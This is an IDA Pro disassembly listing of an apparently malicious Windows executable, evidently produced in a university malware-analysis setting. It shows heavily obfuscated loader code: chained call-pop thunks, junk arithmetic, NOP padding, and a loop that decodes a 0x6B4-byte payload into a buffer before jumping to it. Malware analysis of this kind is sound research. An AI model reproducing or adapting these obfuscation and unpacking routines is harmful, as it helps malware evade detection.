;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	1B1CB00296B74FC956D68AAD093B5276
; Input	CRC32 :	312AB780

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\1b1cb00296b74fc956d68aad093b5276
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 000017B0 (   6064.)
; Section size in file		: 00001800 (   6144.)
; Offset to raw	data for section: 0004E400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 60h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401060	proc near		; CODE XREF: sub_401660+Bp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		mov	esi, offset dword_4BA330
		and	edi, [esi-1C8h]
		mov	edi, 0
		push	edi
		rep call sub_401086
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401060	endp


; =============== S U B	R O U T	I N E =======================================


sub_401086	proc near		; CODE XREF: sub_401060+19p
		pop	ecx
		call	ecx
		push	esi
		push	dword ptr [esi+150h]
		push	eax
		push	ecx
		push	dword ptr [esi+2ECh]
		call	sub_401954
		add	esp, 10h
		pop	esi
		push	0
		rep call sub_4010B0
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401086	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4010B0	proc near		; CODE XREF: sub_401086+1Dp
		pop	ecx
		call	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_4010B0	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4010BC	proc near		; CODE XREF: sub_401B90+18p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		mov	esi, offset dword_4BA138
		adc	edi, eax
		push	esi
		push	dword ptr [esi+3A4h]
		push	ebx
		push	dword ptr [esi+26Ch]
		call	sub_40163C
		add	esp, 0Ch
		pop	esi
		push	0
		rep call sub_4010F1
		mov	eax, ds:PulseEvent
		jmp	eax
sub_4010BC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4010F1	proc near		; CODE XREF: sub_4010BC+28p
		pop	ecx
		call	ecx
		mov	eax, 0
		push	eax
		rep call sub_401107
		mov	eax, ds:CloseHandle
		jmp	eax
sub_4010F1	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401107	proc near		; CODE XREF: sub_4010F1+9p
		pop	ecx
		call	ecx
		add	esp, 40h
		pop	ebp
		retn	0
sub_401107	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401114	proc near		; CODE XREF: sub_401F13+7p

var_20		= dword	ptr -20h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		lea	ebx, [edx+2B4h]
		sub	[ebp+var_20], 74FCh
		push	ebx
		push	dword ptr [ebx+0D0h]
		push	ecx
		push	dword ptr [ebx+14Ch]
		call	sub_4012AC
		add	esp, 0Ch
		pop	ebx
		push	0
		rep call sub_40114F
		mov	eax, ds:CloseHandle
		jmp	eax
sub_401114	endp


; =============== S U B	R O U T	I N E =======================================


sub_40114F	proc near		; CODE XREF: sub_401114+2Ep
		pop	ecx
		call	ecx
		lea	esi, [ebx-310h]	; CODE XREF: sub_401166+5j
		push	esi
		rep call sub_401166
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_40114F	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401166	proc near		; CODE XREF: sub_40114F+Ap
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short near ptr loc_401152+1
		add	esp, 48h
		pop	ebp
		retn	0
sub_401166	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401174	proc near		; CODE XREF: sub_401D14+22p

var_38		= dword	ptr -38h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		lea	ebx, [edx-390h]
		mov	edi, [ebp+var_38]
		push	ebx
		push	eax
		push	eax
		push	edx
		call	sub_4016F8
		add	esp, 0Ch
		pop	ebx
		lea	eax, [ebx-30h]	; CODE XREF: sub_4011A3+5j
		push	eax
		rep call sub_4011A3
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_401174	endp


; =============== S U B	R O U T	I N E =======================================


sub_4011A3	proc near		; CODE XREF: sub_401174+22p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short near ptr loc_401192+1
		mov	eax, 0
		push	eax
		rep call sub_4011BD
		mov	eax, ds:CloseHandle
		jmp	eax
sub_4011A3	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4011BD	proc near		; CODE XREF: sub_4011A3+Dp
		pop	ecx
		call	ecx
		add	esp, 38h
		pop	ebp
		retn	0
sub_4011BD	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4011C8	proc near		; CODE XREF: start+43j

var_34		= dword	ptr -34h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		lea	ebx, asc_4BA050	; "					  "...
		sub	edx, [ebp+var_34]
		push	0
		rep call sub_4011E8
		mov	eax, ds:SetLastError
		jmp	eax
sub_4011C8	endp


; =============== S U B	R O U T	I N E =======================================


sub_4011E8	proc near		; CODE XREF: sub_4011C8+13p
		pop	ecx
		call	ecx
		push	ebx
		push	eax
		push	dword ptr [ebx+2D0h]
		push	dword ptr [ebx+0FCh]
		push	edi
		call	sub_402060
		add	esp, 10h
		pop	ebx
		mov	eax, offset GetModuleHandleA
		mov	eax, [eax]
		push	eax
		push	dword ptr [ebx+2E4h]
		pop	edi
		call	edi
		add	esp, 44h
		pop	ebp
		retn	0
sub_4011E8	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 91h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4012AC	proc near		; CODE XREF: sub_401114+23p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	edi, dword_4BA20C
		xor	ebx, 6Eh
		push	0
		rep call sub_4012CC
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_4012AC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4012CC	proc near		; CODE XREF: sub_4012AC+13p
		pop	ecx
		call	ecx
		push	edi
		push	eax
		push	eax
		push	ecx
		call	sub_401F44
		add	esp, 0Ch
		pop	edi
		push	0
		rep call sub_4012EB
		mov	eax, ds:Sleep
		jmp	eax
sub_4012CC	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4012EB	proc near		; CODE XREF: sub_4012CC+12p
		pop	ecx
		call	ecx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_4012EB	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4012F8	proc near		; CODE XREF: sub_401A54+19p

var_54		= dword	ptr -54h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		sbb	eax, 0FFFFCF6Ch
		lea	ecx, [ebx-2Ch]
		push	ecx
		mov	eax, 6B4h
		push	eax
		mov	edi, 6B4h
		push	edi
		mov	esi, 40001h
		push	esi
		mov	edi, 0B9C59E39h
		push	dword ptr [edi+467A9213h]
		sub	[esp+54h+var_54], 2
		mov	edi, offset LoadLibraryW
		pop	dword ptr [edi]
		rep call sub_40133E
		mov	eax, ds:LoadLibraryW
		jmp	eax
sub_4012F8	endp


; =============== S U B	R O U T	I N E =======================================


sub_40133E	proc near		; CODE XREF: sub_4012F8+39p

arg_0		= dword	ptr  4

		pop	ecx
		call	ecx
		xchg	eax, [esp-4+arg_0]
		mov	ecx, eax
		pop	dword ptr [ecx+280h]
		mov	edx, [ecx+280h]
		mov	esi, edx
		sub	edx, edx
		dec	edx
		and	edx, offset word_4020EE
		mov	eax, 22419A76h
		push	dword ptr [edx]
		pop	dword ptr [esi]
		add	edx, 1
		add	esi, 1
		xor	edi, edi

loc_40136E:				; CODE XREF: sub_40133E+52j
		xor	ebx, ebx
		push	dword ptr [edx]
		adc	[esp-4+arg_0], eax
		pop	dword ptr [esi+ebx*2]
		sub	eax, eax
		sbb	eax, [edx+eax*4]
		neg	eax
		shr	eax, 1
		add	edx, 4
		add	esi, 4
		add	edi, 4
		cmp	edi, 6B4h
		jnz	short loc_40136E
		push	ecx
		mov	ecx, 0
		push	ecx
		rep call sub_4013A6
		mov	eax, ds:SetEvent
		jmp	eax
sub_40133E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4013A6	proc near		; CODE XREF: sub_40133E+5Bp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 40h
		pop	ebp
		retn	0
sub_4013A6	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 33h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4013E4	proc near		; CODE XREF: sub_401954+1Dp
		mov	edi, edi
		push	ebp

loc_4013E7:				; CODE XREF: sub_4013E4+10j
		mov	ebp, esp
		sub	esp, 38h
		lea	eax, [edx+28h]
		cmp	eax, 24B1h
		jb	short loc_4013E7
		push	eax
		push	dword ptr [eax+3DCh]
		push	ecx
		call	sub_401C60
		add	esp, 8
		pop	eax
		push	eax
		mov	ecx, 0
		push	ecx
		rep call sub_40141B
		mov	eax, ds:SetEvent
		jmp	eax
sub_4013E4	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40141B	proc near		; CODE XREF: sub_4013E4+2Ap
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		rep call sub_40142D
		mov	eax, ds:GetTickCount
		jmp	eax
sub_40141B	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40142D	proc near		; CODE XREF: sub_40141B+5p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 38h
		pop	ebp
		retn	0
sub_40142D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401438	proc near		; CODE XREF: sub_401BE0+1Ap
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		lea	ecx, [eax-340h]
		adc	esi, [ecx-2Ch]
		push	ecx
		push	0
		rep call sub_401459
		mov	eax, ds:IsWindow
		jmp	eax
sub_401438	endp


; =============== S U B	R O U T	I N E =======================================


sub_401459	proc near		; CODE XREF: sub_401438+14p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	dword ptr [ecx+2E8h]
		push	edx
		call	sub_401EEC
		add	esp, 8
		pop	ecx
		push	ecx
		mov	edi, 0
		push	edi
		rep call sub_401482
		mov	eax, ds:SetLastError
		jmp	eax
sub_401459	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401482	proc near		; CODE XREF: sub_401459+1Cp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 50h
		pop	ebp
		retn	0
sub_401482	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 153h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4015E0	proc near		; CODE XREF: sub_401F63+18p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		mov	edx, offset dword_4BA198
		and	[edx+0C4h], edx
		push	edx
		push	ebx
		push	dword ptr [edx+3BCh]
		push	dword ptr [edx+134h]
		push	edi
		call	sub_401B90
		add	esp, 10h
		pop	edx
		push	edx
		push	0
		rep call sub_40161B
		mov	eax, ds:LocalFree
		jmp	eax
sub_4015E0	endp


; =============== S U B	R O U T	I N E =======================================


sub_40161B	proc near		; CODE XREF: sub_4015E0+2Ep
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	0
		rep call sub_40162F
		mov	eax, ds:lstrlenA
		jmp	eax
sub_40161B	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40162F	proc near		; CODE XREF: sub_40161B+7p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 50h
		pop	ebp
		retn	0
sub_40162F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40163C	proc near		; CODE XREF: sub_4010BC+1Dp

var_8		= dword	ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		lea	edi, [esi+1E4h]
		sub	[ebp+var_8], eax
		mov	ebx, 0
		push	ebx
		rep call sub_401660
		mov	eax, ds:CloseHandle
		jmp	eax
sub_40163C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401660	proc near		; CODE XREF: sub_40163C+17p
		pop	ecx
		call	ecx
		push	edi
		push	eax
		push	dword ptr [edi+348h]
		call	sub_401060
		add	esp, 8
		pop	edi
		lea	edx, [edi-31Ch]	; CODE XREF: sub_401688+5j
		push	edx
		rep call sub_401688
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_401660	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401688	proc near		; CODE XREF: sub_401660+1Bp
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short near ptr loc_401674+1
		add	esp, 40h
		pop	ebp
		retn	0
sub_401688	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 62h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4016F8	proc near		; CODE XREF: sub_401174+15p

var_8		= dword	ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		lea	ecx, [ebx+3B4h]
		sbb	[ebp+var_8], edx
		push	ecx
		push	0
		rep call sub_401719
		mov	eax, ds:PulseEvent
		jmp	eax
sub_4016F8	endp


; =============== S U B	R O U T	I N E =======================================


sub_401719	proc near		; CODE XREF: sub_4016F8+14p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	dword ptr [ecx+128h]
		push	dword ptr [ecx+19Ch]
		push	ebx
		push	dword ptr [ecx+68h]
		call	sub_401BE0
		add	esp, 10h
		pop	ecx
		push	ecx
		mov	ebx, 0
		push	ebx
		rep call sub_40174B
		mov	eax, ds:Sleep
		jmp	eax
sub_401719	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40174B	proc near		; CODE XREF: sub_401719+25p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_40174B	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 92h dup(90h)

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near

var_4		= dword	ptr -4

		mov	ecx, offset lstrlenA
		push	0
		pop	eax
		nop
		nop
		nop
		nop
		call	ds:GetConsoleTitleA
		add	esp, 0FFFFFFF8h
		xor	eax, eax
		lea	eax, ds:4BA100h[eax*4]
		lea	ecx, [eax+0Ch]
		add	byte ptr [ecx],	4
		push	eax		; lpLibFileName
		call	ds:LoadLibraryW
		push	3Ch
		add	[esp+4+var_4], eax
		pop	ecx
		mov	ecx, [ecx]
		sub	ecx, 0FFFFFFAFh
		mov	eax, [eax+ecx]
		shr	eax, 4
		mov	cl, 25h
		cmp	al, cl
		pusha
		jg	short loc_401830
		jmp	sub_4011C8
; ---------------------------------------------------------------------------

loc_401830:				; CODE XREF: start+41j
		popa
		call	dword ptr [esp+0]
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
start		endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401954	proc near		; CODE XREF: sub_401086+12p

var_24		= dword	ptr -24h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 58h
		mov	edx, 4BA0BCh
		add	esi, [ebp+var_24]
		push	edx
		push	dword ptr [edx+26Ch]
		push	dword ptr [edx+2ECh]
		call	sub_4013E4
		add	esp, 8
		pop	edx
		push	edx
		push	0
		rep call sub_40198A
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401954	endp


; =============== S U B	R O U T	I N E =======================================


sub_40198A	proc near		; CODE XREF: sub_401954+29p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	0
		rep call sub_40199E
		mov	eax, ds:GetDC
		jmp	eax
sub_40198A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40199E	proc near		; CODE XREF: sub_40198A+7p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 58h
		pop	ebp
		retn	0
sub_40199E	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4019AC	proc near		; CODE XREF: sub_401E30+22p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		lea	eax, asc_4BA050+84h
		mov	edi, 7Ch
		push	eax
		push	0
		rep call sub_4019CF
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_4019AC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4019CF	proc near		; CODE XREF: sub_4019AC+16p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+22Ch]
		push	ecx
		push	ecx
		call	sub_401AA4
		add	esp, 0Ch
		pop	eax
		push	eax
		mov	ebx, 0
		push	ebx
		rep call sub_4019F9
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_4019CF	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4019F9	proc near		; CODE XREF: sub_4019CF+1Dp
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 48h
		pop	ebp
		retn	0
sub_4019F9	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401A04	proc near		; CODE XREF: sub_401AA4+1Dp

var_28		= dword	ptr -28h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		lea	esi, [edx-64h]
		mov	[ebp+var_28], 0FFFFA50Fh
		push	esi
		push	edx
		push	ebx
		push	dword ptr [esi+3BCh]
		push	eax
		call	sub_401A54
		add	esp, 10h
		pop	esi
		push	0
		rep call sub_401A38
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401A04	endp


; =============== S U B	R O U T	I N E =======================================


sub_401A38	proc near		; CODE XREF: sub_401A04+27p
		pop	ecx
		call	ecx
		rep call sub_401A48
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401A38	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401A48	proc near		; CODE XREF: sub_401A38+3p
		pop	ecx
		call	ecx
		add	esp, 34h
		pop	ebp
		retn	0
sub_401A48	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401A54	proc near		; CODE XREF: sub_401A04+1Cp

var_1C		= dword	ptr -1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		lea	ebx, asc_4BA050+90h
		and	[ebp+var_1C], eax
		push	ebx
		push	eax
		push	dword ptr [ebx+120h]
		call	sub_4012F8
		add	esp, 8
		pop	ebx
		rep call sub_401A83
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401A54	endp


; =============== S U B	R O U T	I N E =======================================


sub_401A83	proc near		; CODE XREF: sub_401A54+22p
		pop	ecx
		call	ecx
		mov	ecx, 0
		push	ecx
		rep call sub_401A99
		mov	eax, ds:SetLastError
		jmp	eax
sub_401A83	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401A99	proc near		; CODE XREF: sub_401A83+9p
		pop	ecx
		call	ecx
		add	esp, 40h
		pop	ebp
		retn	0
sub_401A99	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401AA4	proc near		; CODE XREF: sub_4019CF+Dp

var_30		= dword	ptr -30h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		lea	edx, dword_4BA240
		sub	[ebp+var_30], ebx
		push	edx
		push	dword ptr [edx+50h]
		push	esi
		push	ecx
		push	dword ptr [edx+100h]
		call	sub_401A04
		add	esp, 10h
		pop	edx
		push	edx
		push	0
		rep call sub_401ADA
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_401AA4	endp


; =============== S U B	R O U T	I N E =======================================


sub_401ADA	proc near		; CODE XREF: sub_401AA4+29p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		mov	esi, 0
		push	esi
		rep call sub_401AF2
		mov	eax, ds:SetEvent
		jmp	eax
sub_401ADA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401AF2	proc near		; CODE XREF: sub_401ADA+Bp
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 40h
		pop	ebp
		retn	0
sub_401AF2	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 93h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401B90	proc near		; CODE XREF: sub_4015E0+22p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		mov	ebx, offset dword_4BA248
		or	edx, edi
		push	ebx
		push	dword ptr [ebx+338h]
		push	eax
		push	edi
		call	sub_4010BC
		add	esp, 0Ch
		pop	ebx
		mov	edx, 0
		push	edx
		rep call sub_401BC4
		mov	eax, ds:SetLastError
		jmp	eax
sub_401B90	endp


; =============== S U B	R O U T	I N E =======================================


sub_401BC4	proc near		; CODE XREF: sub_401B90+27p
		pop	ecx
		call	ecx
		rep call sub_401BD4
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401BC4	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401BD4	proc near		; CODE XREF: sub_401BC4+3p
		pop	ecx
		call	ecx
		add	esp, 20h
		pop	ebp
		retn	0
sub_401BD4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401BE0	proc near		; CODE XREF: sub_401719+15p

var_1C		= dword	ptr -1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		lea	eax, dword_4BA3E0
		or	[ebp+var_1C], edi
		push	eax
		push	edx
		push	dword ptr [eax+13Ch]
		push	edx
		call	sub_401438
		add	esp, 0Ch
		pop	eax
		push	eax
		rep call sub_401C11
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401BE0	endp


; =============== S U B	R O U T	I N E =======================================


sub_401C11	proc near		; CODE XREF: sub_401BE0+24p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	0
		rep call sub_401C25
		mov	eax, ds:PulseEvent
		jmp	eax
sub_401C11	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401C25	proc near		; CODE XREF: sub_401C11+7p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 24h
		pop	ebp
		retn	0
sub_401C25	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401C60	proc near		; CODE XREF: sub_4013E4+1Ap
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		lea	esi, dword_4BA2D4
		adc	edx, [esi+84h]
		push	esi
		push	edi
		push	dword ptr [esi+138h]
		call	sub_401E30
		add	esp, 8
		pop	esi
		mov	ebx, 0
		push	ebx
		rep call sub_401C98
		mov	eax, ds:PulseEvent
		jmp	eax
sub_401C60	endp


; =============== S U B	R O U T	I N E =======================================


sub_401C98	proc near		; CODE XREF: sub_401C60+2Bp
		pop	ecx
		call	ecx
		rep call sub_401CA8
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401C98	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401CA8	proc near		; CODE XREF: sub_401C98+3p
		pop	ecx
		call	ecx
		add	esp, 40h
		pop	ebp
		retn	0
sub_401CA8	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 62h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401D14	proc near		; CODE XREF: sub_402060+23p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		mov	edx, offset dword_4BA3C0
		adc	dword ptr [edx-0D4h], 0
		push	edx
		push	dword ptr [edx+280h]
		push	edi
		push	dword ptr [edx+2A4h]
		call	sub_401174
		add	esp, 0Ch
		pop	edx
		push	edx
		push	0
		rep call sub_401D4F
		mov	eax, ds:LocalFree
		jmp	eax
sub_401D14	endp


; =============== S U B	R O U T	I N E =======================================


sub_401D4F	proc near		; CODE XREF: sub_401D14+2Ep
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	0
		rep call sub_401D63
		mov	eax, ds:IsWindow
		jmp	eax
sub_401D4F	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401D63	proc near		; CODE XREF: sub_401D4F+7p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 38h
		pop	ebp
		retn	0
sub_401D63	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C2h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401E30	proc near		; CODE XREF: sub_401C60+1Cp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		mov	ecx, offset dword_4BA3DC
		mov	esi, [ecx-128h]
		push	ecx
		push	eax
		push	ebx
		push	dword ptr [ecx+1C8h]
		push	dword ptr [ecx+0E8h]
		call	sub_4019AC
		add	esp, 10h
		pop	ecx
		push	ecx
		push	0
		rep call sub_401E6B
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_401E30	endp


; =============== S U B	R O U T	I N E =======================================


sub_401E6B	proc near		; CODE XREF: sub_401E30+2Ep
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	0
		rep call sub_401E7F
		mov	eax, ds:SetFocus
		jmp	eax
sub_401E6B	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401E7F	proc near		; CODE XREF: sub_401E6B+7p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_401E7F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 62h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401EEC	proc near		; CODE XREF: sub_401459+Cp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
